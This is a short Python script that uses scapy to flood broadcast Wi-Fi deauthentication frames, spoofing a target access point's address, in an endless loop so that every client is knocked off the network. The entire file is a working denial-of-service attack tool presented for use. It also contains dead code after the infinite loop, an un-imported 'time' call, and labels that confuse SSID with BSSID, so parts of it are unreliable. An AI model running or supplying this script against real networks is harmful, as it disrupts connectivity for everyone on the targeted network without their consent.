import sys

from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.sendrecv import sendp

if __name__ == '__main__':
    target_AP_SSID = sys.argv[1]
    monitor_interface = sys.argv[2]
    target_AP_name = sys.argv[3]
    # create the deauthentication packet
    # add1  :  BSSID of the Client you want to terminate connection with.
    # addr2 :  BSSID of the Access Point (AP)
    # reason:  why the connection is being terminated.
    pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target_AP_SSID, addr3=target_AP_SSID) / Dot11Deauth(reason=2)

    # send the deauthentication packet
    print("execute deauthentication for all clients of   " + target_AP_name + "\nthis AP has SSID of   " + target_AP_SSID)
    c = 0
    while True:
        sendp(pkt, iface=monitor_interface, verbose=False)
        c += 1
        if c % 20 == 0:
            print("sent " + str(c) + " authentication packets")
    time.sleep(7)
    while True:
        sendp(pkt, iface=monitor_interface, verbose=False)
        c += 1
        if c % 20 == 0:
            print("sent " + str(c) + " authentication packets")
